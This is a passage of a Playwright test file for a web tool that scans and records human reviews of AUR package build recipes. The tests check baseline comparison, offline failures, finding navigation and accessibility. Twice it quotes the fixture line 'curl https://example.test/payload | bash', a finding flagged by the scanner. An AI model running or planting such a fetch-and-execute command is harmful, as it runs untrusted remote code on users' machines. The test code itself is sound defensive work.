});

test("a replaced baseline never supplies reviewed context for an older comparison", async ({
  page,
}) => {
  const api = await fixtureApi(page, {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Original saved baseline.",
  });
  api.setScan(scan(2));
  await openScan(page);
  await page.getByRole("tab", { name: "Changes (1)", exact: true }).click();
  await page.getByRole("button", { name: "Inspect reviewed PKGBUILD line 2", exact: true }).click();
  await expect(page.getByLabel("Reviewed recipe source")).toContainText("pkgver=1");
  const newer = scan();
  newer.files[0] = file(
    "PKGBUILD",
    "build",
    "pkgname=archhub-review-fixture\npkgver=unexpected\ninstall=fixture.install\n",
  );
  newer.digest = hash(JSON.stringify(newer.files));
  api.setSaved({
    scan: newer,
    reviewedAt: 1791200020,
    note: "Another client replaced this baseline.",
  });
  await page.getByRole("button", { name: "Scan current build files again", exact: true }).click();
  await expect(page.getByText(/Reviewed source context is unavailable/)).toBeVisible();
  await expect(page.getByLabel("Reviewed recipe source")).toHaveCount(0);
  await expect(page.getByRole("button", { name: /Inspect reviewed/ })).toHaveCount(0);
  await page.getByRole("button", { name: "Inspect current PKGBUILD line 2", exact: true }).click();
  await expect(page.getByLabel("Current recipe source")).toContainText("pkgver=2");
  await page.getByRole("button", { name: "Reload saved evidence", exact: true }).click();
  await expect(page.getByText(/Reviewed source context is unavailable/)).toHaveCount(0);
  await expect(
    page.getByRole("button", { name: "Inspect reviewed PKGBUILD line 2", exact: true }),
  ).toHaveCount(0);
  await page.getByRole("button", { name: "Inspect reviewed PKGBUILD line 1", exact: true }).click();
  await expect(page.getByLabel("Reviewed recipe source")).toContainText("pkgver=unexpected");
});

for (const priorVersion of [undefined, 999]) {
  test(`matching files with ${priorVersion ?? "unversioned"} analysis require findings review and record the current ruleset`, async ({
    page,
  }) => {
    const saved = scan();
    saved.staticAnalyzerVersion = priorVersion;
    await fixtureApi(page, {
      scan: saved,
      reviewedAt: 1791200010,
      note: "Previously captured human review.",
    });
    await page.goto("/#/reviews");
    await page.getByRole("button", { name: `Open saved review for ${base}` }).click();
    await expect(
      page.getByText(
        priorVersion == null
          ? "Unversioned capture · findings retained as recorded"
          : `Rules v${priorVersion} · text heuristics`,
        { exact: true },
      ),
    ).toBeVisible();
    await page.getByRole("button", { name: "Fetch & run static scan", exact: true }).click();
    await expect(
      page
        .getByRole("dialog")
        .getByText("Analyzer changed · review findings again", { exact: true }),
    ).toBeVisible();
    await expect(page.getByText("Rules v1 · text heuristics", { exact: true })).toBeVisible();
    await expect(page.getByText("Reviewed snapshot", { exact: true })).not.toBeVisible();
    await page.getByRole("tab", { name: "Changes", exact: true }).click();
    await expect(
      page.getByRole("region", { name: "Static finding changes", exact: true }),
    ).toContainText("Finding comparison requires the same known static analyzer version.");
    await expect(page.getByRole("button", { name: /Inspect .* finding/ })).toHaveCount(0);
    await expect(
      page.getByText(
        "Captured files and commit match your saved review. The static analyzer changed; inspect the current findings and record another review.",
        { exact: true },
      ),
    ).toBeVisible();
    await page.getByRole("tab", { name: "Review record", exact: true }).click();
    await expect(
      page
        .getByRole("tabpanel", { name: "Review record" })
        .getByText("Previously captured human review.", { exact: true }),
    ).toBeVisible();
    await page
      .getByRole("textbox", { name: "Review note", exact: true })
      .fill("Inspected findings from the current ruleset.");
    await page.getByRole("checkbox").check();
    await page.getByRole("button", { name: "Record this review", exact: true }).click();
    await expect(page.getByText("Reviewed snapshot", { exact: true })).toBeVisible();
    const pending = page.waitForEvent("download");
    await page.getByRole("button", { name: "Export scan", exact: true }).click();
    const output = JSON.parse(await readFile((await (await pending).path())!, "utf8"));
    expect(output.scan.staticAnalyzerVersion).toBe(1);
    expect(output.baseline.staticAnalyzerVersion).toBe(1);
    expect(output.status).toBe("reviewed");
  });
}

test("incomplete install-script coverage cannot be recorded as reviewed", async ({ page }) => {
  const api = await fixtureApi(page, {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Existing fixture baseline must remain intact on partial fetches.",
  });
  api.setScan({
    ...scan(),
    files: scan().files.filter((file) => file.role !== "install"),
    complete: false,
    warnings: ["fixture.install could not be fetched. Coverage is incomplete."],
  });
  await openScan(page);
  await expect(page.getByText("Incomplete coverage", { exact: true })).toBeVisible();
  await page.getByRole("tab", { name: "Changes", exact: true }).click();
  await expect(page.getByText(/A full comparison is unavailable/)).toBeVisible();
  await expect(
    page.getByRole("region", { name: "Static finding changes", exact: true }),
  ).toHaveCount(0);
  await expect(page.getByLabel("Changes in fixture.install")).toHaveCount(0);
  await page.getByRole("tab", { name: "Review record", exact: true }).click();
  await page
    .getByRole("textbox", { name: "Review note" })
    .fill("A review must not be recorded with missing required files.");
  await expect(page.getByRole("checkbox")).toBeDisabled();
  await expect(page.getByRole("button", { name: "Record this review" })).toBeDisabled();
});

test("failed recipe fetch keeps saved evidence available and current status unknown", async ({
  page,
}) => {
  const api = await fixtureApi(page, {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Saved fixture evidence remains readable offline.",
  });
  api.failSource();
  await page.goto("/#/reviews");
  await page.getByRole("button", { name: `Open saved review for ${base}` }).click();
  await expect(page.getByLabel("Build recipe source")).toBeVisible();
  await page.getByRole("tab", { name: "Changes", exact: true }).click();
  await expect(
    page.getByText(/Fetch the current recipe to compare it with your saved evidence/),
  ).toBeVisible();
  await expect(
    page.getByRole("region", { name: "Static finding changes", exact: true }),
  ).toHaveCount(0);
  await page.getByRole("button", { name: "Fetch & run static scan" }).click();
  await expect(
    page
      .getByRole("dialog")
      .getByText("Recipe source unavailable during this test", { exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("dialog").getByText("Saved snapshot · current state unknown", { exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("region", { name: "Static finding changes", exact: true }),
  ).toHaveCount(0);
  await page.getByRole("tab", { name: "Review record", exact: true }).click();
  await page
    .getByRole("textbox", { name: "Review note" })
    .fill("Network failure must not allow a new current review.");
  await expect(page.getByRole("checkbox")).toBeDisabled();
  await expect(page.getByRole("button", { name: "Record this review" })).toBeDisabled();
});

test("failed rechecks do not relabel newer analysis of identical files as saved evidence", async ({
  page,
}) => {
  const old = scan();
  old.staticAnalyzerVersion = undefined;
  const api = await fixtureApi(page, {
    scan: old,
    reviewedAt: 1791200010,
    note: "Unversioned saved review with older analysis.",
  });
  await openScan(page);
  await expect(
    page.getByRole("dialog").getByText("Analyzer changed · review findings again", { exact: true }),
  ).toBeVisible();
  api.failSource();
  await page.getByRole("button", { name: "Scan current build files again", exact: true }).click();
  await expect(
    page.getByRole("dialog").getByText("Previous capture · current state unknown", { exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("dialog").getByText("Saved snapshot · current state unknown", { exact: true }),
  ).toHaveCount(0);
  const pending = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export scan", exact: true }).click();
  const output = JSON.parse(await readFile((await (await pending).path())!, "utf8"));
  expect(output.status).toBe("capture-current-unknown");
  expect(output.scan.staticAnalyzerVersion).toBe(1);
  expect(output.baseline.staticAnalyzerVersion).toBeUndefined();
});

test("large evidence lists remain paged and findings jump to the right source window", async ({
  page,
}) => {
  const api = await fixtureApi(page);
  const large = scan();
  large.files[0] = file(
    "PKGBUILD",
    "build",
    Array.from({ length: 600 }, (_, index) => `# fixture source line ${index + 1}`).join("\n"),
  );
  large.findings = Array.from({ length: 120 }, (_, index) => ({
    ...large.findings[0]!,
    id: `fixture-${index}`,
    title: `Flagged fixture line ${index}`,
    file: "PKGBUILD",
    line: index === 119 ? 450 : index + 1,
  }));
  api.setScan(large);
  await openScan(page);
  await expect(page.getByText("Findings 1–25 of 120", { exact: true })).toBeVisible();
  for (let index = 0; index < 4; index++)
    await page.getByRole("button", { name: "Next finding page" }).click();
  await expect(page.getByText("Findings 101–120 of 120", { exact: true })).toBeVisible();
  await page.getByRole("button", { name: /Flagged fixture line 119/ }).click();
  await expect(page.getByLabel("Build recipe source")).toBeFocused();
  await expect(page.getByText("Lines 401–600 of 600", { exact: true })).toBeVisible();
  await expect(page.getByText("· Selected PKGBUILD:450", { exact: false })).toBeVisible();
  await expect(page.getByLabel("Build recipe source")).toContainText("# fixture source line 450");
  await expect(
    page
      .getByLabel("Build recipe source")
      .locator("code")
      .filter({ hasText: "# fixture source line 450" }),
  ).toBeInViewport();
  await page.getByRole("button", { name: "Previous source lines" }).click();
  await expect(page.getByText("Lines 1–400 of 600", { exact: true })).toBeVisible();
  await page.getByRole("button", { name: /Flagged fixture line 119/ }).click();
  await expect(page.getByText("Lines 401–600 of 600", { exact: true })).toBeVisible();
  await expect(
    page
      .getByLabel("Build recipe source")
      .locator("code")
      .filter({ hasText: "# fixture source line 450" }),
  ).toBeInViewport();
});

test("a different capture clears selected source context and clamps smaller finding pages", async ({
  page,
}) => {
  const api = await fixtureApi(page);
  const initial = scan();
  initial.findings = Array.from({ length: 70 }, (_, index) => ({
    ...initial.findings[0]!,
    id: `pattern-${index}`,
    title: `Pattern ${index}`,
  }));
  api.setScan(initial);
  await openScan(page);
  for (let index = 0; index < 2; index++)
    await page.getByRole("button", { name: "Next finding page" }).click();
  await page.getByRole("button", { name: /^Pattern 69/ }).click();
  await expect(page.getByText(/Selected fixture.install:2/)).toBeVisible();
  api.setScan(scan(2));
  await page.getByRole("button", { name: "Scan current build files again", exact: true }).click();
  await expect(page.getByText("Findings 1–1 of 1", { exact: true })).toBeVisible();
  await expect(page.getByText(/Selected fixture.install:2/)).toHaveCount(0);
});

test("static finding search and severity filters keep full scan exports and exact install-script jumps", async ({
  page,
}) => {
  const api = await fixtureApi(page);
  const capture = scan();
  capture.findings.push({
    ...capture.findings[0]!,
    id: "PKGBUILD:checksum-3",
    title: "Checksum verification may be skipped",
    description: "Review each SKIP entry.",
    severity: "medium",
    file: "PKGBUILD",
    line: 3,
  });
  api.setScan(capture);
  await openScan(page);
  const search = page.getByRole("textbox", { name: "Search static findings" });
  await search.fill(" CHECKSUM-3 ");
  await expect(page.getByText("Findings 1–1 of 1 · 2 captured", { exact: true })).toBeVisible();
  await page.getByRole("button", { name: "High & critical", exact: true }).click();
  await expect(
    page.getByText("No patterns match these filters. The full capture remains in the export."),
  ).toBeVisible();
  const pending = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export scan", exact: true }).click();
  const exported = JSON.parse(await readFile((await (await pending).path())!, "utf8"));
  expect(exported.scan).toEqual(capture);
  await search.fill("fixture.install");
  await page.getByRole("button", { name: /Remote content piped to a shell/ }).click();
  await expect(page.getByLabel("Build recipe source")).toBeFocused();
  await expect(
    page
      .getByLabel("Build recipe source")
      .locator("code")
      .filter({ hasText: "curl https://example.test/payload | bash" }),
  ).toBeInViewport();
  await expect(page.getByText(/Selected fixture.install:2/)).toBeVisible();
});

test("missing and out-of-range static locations never jump to another file", async ({ page }) => {
  const api = await fixtureApi(page);
  const capture = scan();
  capture.findings = [
    {
      ...capture.findings[0]!,
      id: "missing",
      title: "Missing source finding",
      file: "missing.install",
    },
    { ...capture.findings[0]!, id: "out-of-range", title: "Out-of-range finding", line: 900 },
    { ...capture.findings[0]!, id: "no-line", title: "Finding without line", line: null },
    {
      ...capture.findings[0]!,
      id: "legacy",
      title: "Legacy PKGBUILD finding",
      file: null,
      line: 3,
    },
  ];
  api.setScan(capture);
  await openScan(page);
  for (const name of [/Missing source finding/, /Out-of-range finding/, /Finding without line/])
    await expect(page.getByRole("button", { name })).toBeDisabled();
  await expect(
    page.getByText("Source location unavailable in this capture.", { exact: true }),
  ).toHaveCount(3);
  await expect(page.getByRole("combobox", { name: "Build file", exact: true })).toContainText(
    "PKGBUILD",
  );
  await expect(page.getByText(/Selected .*:/)).toHaveCount(0);
  await page.getByRole("button", { name: /Legacy PKGBUILD finding/ }).click();
  await expect(page.getByText(/Selected PKGBUILD:3/)).toBeVisible();
});

for (const theme of ["light", "dark"] as const) {
  test(`${theme} recipe review and diff have no automated WCAG violations`, async ({ page }) => {
    await page.addInitScript(
      (theme) =>
        localStorage.setItem("archhub.preferences", JSON.stringify({ theme, compact: false })),
      theme,
    );
    const api = await fixtureApi(page, {
      scan: scan(),
      reviewedAt: 1791200010,
      note: "Saved fixture review for accessibility verification.",
    });
    api.setScan(scan(2));
    await page.goto("/#/reviews");
    await expect(page.getByRole("button", { name: `Open saved review for ${base}` })).toBeVisible();
    expect(
      (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
        .violations,
    ).toEqual([]);
    const row = page.getByRole("article", { name: `Saved review for ${base}`, exact: true });
    const rowCheck = row.getByRole("button", {
      name: `Check current recipe for ${base}`,
      exact: true,
    });
    await rowCheck.focus();
    await page.keyboard.press("Enter");
    await expect(row).toContainText("Changed since review");
    expect(
      (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
        .violations,
    ).toEqual([]);
    await page.screenshot({ path: `artifacts/review-recheck-${theme}.png` });
    await page.setViewportSize({ width: 390, height: 844 });
    await page.evaluate(
      () =>
        new Promise<void>((resolve) =>
          requestAnimationFrame(() => requestAnimationFrame(() => resolve())),
        ),
    );
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(
      390,
    );
    expect(
      (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
        .violations,
    ).toEqual([]);
    await page.screenshot({ path: `artifacts/review-recheck-${theme}-mobile.png`, fullPage: true });
    await page.setViewportSize({ width: 1440, height: 1080 });
    await row.getByRole("button", { name: `Review comparison for ${base}`, exact: true }).click();
    await expect(
      page.getByRole("dialog").getByText("Changed since review", { exact: true }),
    ).toBeVisible();
    for (const tab of ["Files & findings", "Changes (1)", "Review record"]) {
      await page.getByRole("tab", { name: tab, exact: true }).click();
      if (tab === "Changes (1)") {
        const comparison = page.getByRole("region", {
          name: "Static finding changes",
          exact: true,
        });
        await comparison.getByRole("button", { name: "Still reported (1)", exact: true }).click();
        await comparison
          .getByRole("button", {
            name: "Inspect current finding fixture.install line 2",
            exact: true,
          })
          .click();
        await expect(
          comparison.getByLabel("Finding source context", { exact: true }),
        ).toBeFocused();
        expect(
          (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
            .violations,
        ).toEqual([]);
        await comparison.getByRole("button", { name: "Return to findings", exact: true }).click();
        const action = page.getByRole("button", {
          name: "Inspect current PKGBUILD line 2",
          exact: true,
        });
        await action.focus();
        await page.keyboard.press("Enter");
        await expect(page.getByLabel("Current recipe source")).toBeFocused();
        const search = page
          .getByLabel("Current recipe source")
          .getByRole("textbox", { name: "Find in captured file", exact: true });
        await search.fill("PKGVER=2");
        await expect(search).toBeFocused();
        await expect(
          page.getByLabel("Current recipe source").locator("code").nth(1),
        ).toBeInViewport();
      }
      const result = await new AxeBuilder({ page })
        .withTags(["wcag2a", "wcag2aa", "wcag21aa"])
        .analyze();
      expect(
        result.violations.map((violation) => ({
          id: violation.id,
          nodes: violation.nodes.map((node) => node.target),
        })),
      ).toEqual([]);
    }
    await page.setViewportSize({ width: 390, height: 844 });
    await page.evaluate(
      () =>
        new Promise<void>((resolve) =>
          requestAnimationFrame(() => requestAnimationFrame(() => resolve())),
        ),
    );
    await expect(page.getByRole("textbox", { name: "Review note" })).toBeVisible();
    const overflow = await page.evaluate(() => ({
      width: window.innerWidth,
      scrollWidth: document.documentElement.scrollWidth,
      elements: [...document.querySelectorAll("body *")]
        .map((element) => ({
          tag: element.tagName,
          class: element.className,
          text: element.textContent?.slice(0, 80),
          right: element.getBoundingClientRect().right,
          width: element.getBoundingClientRect().width,
        }))
        .filter((element) => element.right > window.innerWidth + 1)
        .slice(0, 12),
    }));
    expect(overflow.scrollWidth, JSON.stringify(overflow)).toBeLessThanOrEqual(overflow.width);
    await page.screenshot({ path: `artifacts/recipe-review-${theme}-mobile.png`, fullPage: true });
    await page.getByRole("tab", { name: "Changes (1)", exact: true }).click();
    await page
      .getByRole("button", { name: "Inspect reviewed PKGBUILD line 2", exact: true })
      .click();
    await expect(page.getByLabel("Reviewed recipe source")).toBeFocused();
    const sourceSearch = page
      .getByLabel("Reviewed recipe source")
      .getByRole("textbox", { name: "Find in captured file", exact: true });
    await sourceSearch.fill("PKGVER=1");
    await expect(sourceSearch).toBeFocused();
    await expect(page.getByLabel("Reviewed recipe source").locator("code").nth(1)).toBeInViewport();
    expect(
      (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
        .violations,
    ).toEqual([]);
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(
      390,
    );
    await page.screenshot({ path: `artifacts/recipe-changes-${theme}-mobile.png`, fullPage: true });
    await page.getByRole("tab", { name: "Files & findings", exact: true }).click();
    await expect(page.getByRole("textbox", { name: "Search static findings" })).toBeVisible();
    expect(
      (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
        .violations,
    ).toEqual([]);
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(
      390,
    );
    await page.getByRole("button", { name: /Remote content piped to a shell/ }).click();
    await expect(page.getByLabel("Build recipe source")).toBeFocused();
    await expect(
      page
        .getByLabel("Build recipe source")
        .locator("code")
        .filter({ hasText: "curl https://example.test/payload | bash" }),
    ).toBeInViewport();
    await page.screenshot({
      path: `artifacts/static-findings-${theme}-mobile.png`,
      fullPage: true,
    });
  });
}

async function navigateRecipeRoute(page: Page, route: string) {
  await page.evaluate((value) => {
    window.location.hash = `/${value}`;
  }, route);
  await expect(page).toHaveURL(new RegExp(`#/${route}$`));
}
async function recipeExport(page: Page, name = "Export scan") {
  const pending = page.waitForEvent("download");
  await page.getByRole("button", { name, exact: true }).click();
  return JSON.parse(await readFile((await (await pending).path())!, "utf8"));
}
function readOnlyRecipeRequests(api: Awaited<ReturnType<typeof fixtureApi>>) {
  expect(
    api.requests.filter((request) =>
      /record_recipe_review|remove_recipe_review/.test(request.command),
    ),
  ).toEqual([]);
}

test("recipe rechecks retain pending and failure state through a route without observers", async ({
  page,
}) => {
  const saved: RecipeReview = {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Immutable lifecycle baseline.",
  };
  const api = await fixtureApi(page, saved);
  await page.goto("/#/reviews");
  const row = page.getByRole("article", { name: `Saved review for ${base}`, exact: true });
  const check = row.getByRole("button", { name: `Check current recipe for ${base}`, exact: true });
  await check.click();
  await expect(row).toContainText("Matches saved snapshot");
  const release = api.holdSource();
  api.failSource();
  try {
    await check.click();
    await expect(row).toContainText("Checking current recipe…");
    await navigateRecipeRoute(page, "history");
    await expect(page.getByRole("heading", { name: "Activity", exact: true })).toBeVisible();
    await navigateRecipeRoute(page, "reviews");
    await expect(row).toContainText("Checking current recipe…");
    await expect(check).toBeDisabled();
    await expect(row.getByText("Matches saved snapshot", { exact: true })).toHaveCount(0);
    expect(await recipeExport(page, `Export saved review for ${base}`)).toEqual(saved);
    await row.getByRole("button", { name: `Open evidence for ${base}`, exact: true }).click();
    const dialog = page.getByRole("dialog");
    await expect(
      dialog.getByText("Saved snapshot · current state unknown", { exact: true }),
    ).toBeVisible();
    expect((await recipeExport(page)).status).toBe("saved-current-unknown");
    await dialog.getByRole("tab", { name: "Review record", exact: true }).click();
    await dialog
      .getByRole("textbox", { name: "Review note", exact: true })
      .fill("Review the newly captured files first.");
    await expect(dialog.getByRole("checkbox")).toBeDisabled();
    await expect(
      dialog.getByRole("button", { name: "Record this review", exact: true }),
    ).toBeDisabled();
    release();
    await expect(
      dialog.getByText("Recipe source unavailable during this test", { exact: true }),
    ).toBeVisible();
    await page.keyboard.press("Escape");
    await navigateRecipeRoute(page, "history");
    await navigateRecipeRoute(page, "reviews");
    await expect(row).toContainText("Current check failed · remote state unknown");
    expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(2);
    api.restoreSource();
    api.setScan(scan(2));
    await check.click();
    await expect(row).toContainText("Changed since review");
    await row.getByRole("button", { name: `Review comparison for ${base}`, exact: true }).click();
    await expect(page.getByLabel("Changes in PKGBUILD")).toContainText("+pkgver=2");
    expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(3);
    expect(api.getSaved()).toEqual(saved);
    readOnlyRecipeRequests(api);
  } finally {
    release();
  }
});

test("closing and reopening an AUR inspection preserves its in-flight capture", async ({
  page,
}) => {
  const api = await fixtureApi(page);
  await openScan(page);
  api.setScan(scan(2));
  const release = api.holdSource();
  try {
    await page.getByRole("button", { name: "Scan current build files again", exact: true }).click();
    await expect(
      page.getByRole("button", { name: "Fetching & scanning…", exact: true }),
    ).toBeDisabled();
    await page.keyboard.press("Escape");
    await expect(page.getByRole("dialog")).toHaveCount(0);
    await page.getByRole("button", { name: `View ${base}`, exact: true }).click();
    await page.getByRole("tab", { name: "Static scan", exact: true }).click();
    const dialog = page.getByRole("dialog");
    await expect(
      dialog.getByRole("button", { name: "Fetching & scanning…", exact: true }),
    ).toBeDisabled();
    await expect(
      dialog.getByText("Previous capture · current state unknown", { exact: true }),
    ).toBeVisible();
    const pending = await recipeExport(page);
    expect(pending.status).toBe("capture-current-unknown");
    expect(pending.scan).toEqual(scan());
    await dialog.getByRole("tab", { name: "Review record", exact: true }).click();
    await expect(dialog.getByRole("checkbox")).toBeDisabled();
    release();
    await expect(dialog.getByText("Not reviewed", { exact: true })).toBeVisible();
    await expect(dialog.getByRole("checkbox")).toBeEnabled();
    await expect(dialog.getByRole("checkbox")).not.toBeChecked();
    expect((await recipeExport(page)).scan).toEqual(scan(2));
    expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(2);
    readOnlyRecipeRequests(api);
  } finally {
    release();
  }
});

test("an offline recipe recheck fails visibly without exposing a current comparison or writable review", async ({
  page,
  context,
}) => {
  const saved: RecipeReview = {
    scan: scan(),
    reviewedAt: 1791200010,
    note: "Offline immutable baseline.",
  };
  const api = await fixtureApi(page, saved);
  const attempted: string[] = [];
  page.on("request", (request) => {
    if (request.url().endsWith("/api/query") && request.postDataJSON().command === "recipe")
      attempted.push(request.postDataJSON().base);
  });
  await page.goto("/#/reviews");
  const row = page.getByRole("article", { name: `Saved review for ${base}`, exact: true });
  const check = row.getByRole("button", { name: `Check current recipe for ${base}`, exact: true });
  await check.click();
  await expect(row).toContainText("Matches saved snapshot");
  await row.getByRole("button", { name: `Review comparison for ${base}`, exact: true }).click();
  await expect(
    page.getByRole("region", { name: "Static finding changes", exact: true }),
  ).toContainText("Still reported (1)");
  await page.keyboard.press("Escape");
  let offline = true;
  await page.route("**/api/query", (route) =>
    route.request().postDataJSON().command === "recipe" && offline
      ? route.continue()
      : route.fallback(),
  );
  await context.setOffline(true);
  await page.evaluate(() => window.dispatchEvent(new Event("offline")));
  try {
    await check.click();
    await expect(row).toContainText("Current check failed · remote state unknown");
    await expect(row).toContainText(/NetworkError|Failed to fetch/);
    await expect(row.getByRole("button", { name: /Review comparison/ })).toHaveCount(0);
    await row.getByRole("button", { name: `Open evidence for ${base}`, exact: true }).click();
    const dialog = page.getByRole("dialog");
    expect((await recipeExport(page)).status).toBe("saved-current-unknown");
    await dialog.getByRole("tab", { name: "Review record", exact: true }).click();
    await expect(dialog.getByRole("checkbox")).toBeDisabled();
    await expect(
      dialog.getByRole("button", { name: "Record this review", exact: true }),
    ).toBeDisabled();
    offline = false;
    await context.setOffline(false);
    await page.evaluate(() => window.dispatchEvent(new Event("online")));
    await expect(
      dialog.getByText("Saved snapshot · current state unknown", { exact: true }),
    ).toBeVisible();
    expect(attempted).toEqual([base, base]);
    api.setScan(scan(2));
    await dialog.getByRole("button", { name: "Try again", exact: true }).click();
    await expect(dialog.getByText("Changed since review", { exact: true })).toBeVisible();
    expect((await recipeExport(page)).scan).toEqual(scan(2));
    expect(attempted).toEqual([base, base, base]);
    expect(api.getSaved()).toEqual(saved);
    readOnlyRecipeRequests(api);
  } finally {
    offline = false;
    await context.setOffline(false);
    await page.evaluate(() => window.dispatchEvent(new Event("online")));
  }
});

test("stale open inspections never auto-scan on reconnect and explicit scans reset acknowledgment", async ({
  page,
}) => {
  const api = await fixtureApi(page);
  await openScan(page);
  const dialog = page.getByRole("dialog");
  await dialog.getByRole("tab", { name: "Review record", exact: true }).click();
  await dialog
    .getByRole("textbox", { name: "Review note", exact: true })
    .fill("Review this exact capture before recording.");
  await dialog.getByRole("checkbox").check();
  await expect(
    dialog.getByRole("button", { name: "Record this review", exact: true }),
  ).toBeEnabled();
  await page.clock.install();
  await page.clock.fastForward(300_001);
  await page.evaluate(() => {
    window.dispatchEvent(new Event("offline"));
    window.dispatchEvent(new Event("online"));
  });
  await page.evaluate(
    () => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))),
  );
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(1);
  api.setScan(scan(2));
  await dialog.getByRole("button", { name: "Scan current build files again", exact: true }).click();
  await expect(dialog.getByRole("checkbox")).not.toBeChecked();
  await expect(dialog.getByText("Not reviewed", { exact: true })).toBeVisible();
  await expect(
    dialog.getByRole("button", { name: "Record this review", exact: true }),
  ).toBeDisabled();
  expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(2);
  readOnlyRecipeRequests(api);
});

for (const theme of ["light", "dark"]) {
  test(`${theme} pending recipe review keeps saved evidence usable and acknowledgment disabled at 390px`, async ({
    page,
  }) => {
    const saved: RecipeReview = {
      scan: scan(),
      reviewedAt: 1791200010,
      note: "Pending acknowledgment baseline.",
    };
    const api = await fixtureApi(page, saved);
    api.setScan(scan(2));
    await page.addInitScript(
      (value) =>
        localStorage.setItem(
          "archhub.preferences",
          JSON.stringify({ theme: value, compact: true }),
        ),
      theme,
    );
    await page.goto("/#/reviews");
    const row = page.getByRole("article", { name: `Saved review for ${base}`, exact: true });
    const release = api.holdSource();
    try {
      await row
        .getByRole("button", { name: `Check current recipe for ${base}`, exact: true })
        .click();
      await expect(row).toContainText("Checking current recipe…");
      await row.getByRole("button", { name: `Open evidence for ${base}`, exact: true }).click();
      const dialog = page.getByRole("dialog");
      await expect(
        dialog.getByText("Saved snapshot · current state unknown", { exact: true }),
      ).toBeVisible();
      const pending = await recipeExport(page);
      expect(pending.status).toBe("saved-current-unknown");
      expect(pending.scan).toEqual(saved.scan);
      await dialog.getByRole("tab", { name: "Review record", exact: true }).click();
      await dialog
        .getByRole("textbox", { name: "Review note", exact: true })
        .fill("Review the new capture after it arrives.");
      await expect(dialog.getByRole("checkbox")).toBeDisabled();
      await expect(
        dialog.getByRole("button", { name: "Record this review", exact: true }),
      ).toBeDisabled();
      await page.setViewportSize({ width: 390, height: 900 });
      await page.evaluate(() => document.fonts.ready);
      await page.evaluate(
        () => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve))),
      );
      for (const state of ["pending", "captured"]) {
        if (state === "captured") {
          release();
          await expect(dialog.getByText("Changed since review", { exact: true })).toBeVisible();
          await expect(dialog.getByRole("checkbox")).toBeEnabled();
          await expect(dialog.getByRole("checkbox")).not.toBeChecked();
          await expect(
            dialog.getByRole("button", { name: "Record this review", exact: true }),
          ).toBeDisabled();
          await dialog.getByRole("checkbox").check();
          await expect(
            dialog.getByRole("button", { name: "Record this review", exact: true }),
          ).toBeEnabled();
        }
        expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(
          390,
        );
        expect(
          (await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze())
            .violations,
        ).toEqual([]);
        await page.screenshot({
          path: `artifacts/recipe-lifecycle-${theme}-${state}-390.png`,
          fullPage: true,
        });
      }
      expect(api.getSaved()).toEqual(saved);
      expect(api.requests.filter((request) => request.command === "recipe")).toHaveLength(1);
      readOnlyRecipeRequests(api);
    } finally {
      release();
    }
  });
}
